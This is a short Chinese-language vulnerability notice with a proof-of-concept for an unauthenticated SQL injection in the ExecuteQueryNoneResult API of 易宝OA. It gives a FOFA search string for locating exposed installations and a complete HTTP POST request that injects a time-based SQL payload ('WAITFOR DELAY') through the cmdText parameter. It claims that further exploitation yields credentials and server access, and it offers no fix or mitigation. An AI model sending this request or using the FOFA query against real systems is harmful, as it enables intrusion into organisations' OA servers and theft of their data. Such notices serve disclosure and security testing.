# 易宝OA-ExecuteQueryNoneResult接口处存在SQL注入漏洞

易宝OA ExecuteQueryNoneResult接口处存在SQL注入漏洞，未经身份认证的攻击者可以通过此漏洞获取数据库敏感信息，用户名密码等凭据，进一步利用可获取服务器权限。

## FOFA

```javascript
product="顶讯科技-易宝OA系统"
```

## poc

```javascript
POST /api/system/ExecuteQueryNoneResult HTTP/1.1
Host: your-ip
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
 
token=zxh&cmdText=;WAITFOR DELAY '0:0:5'--
```

![image-20241025142137455](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410251421525.png)
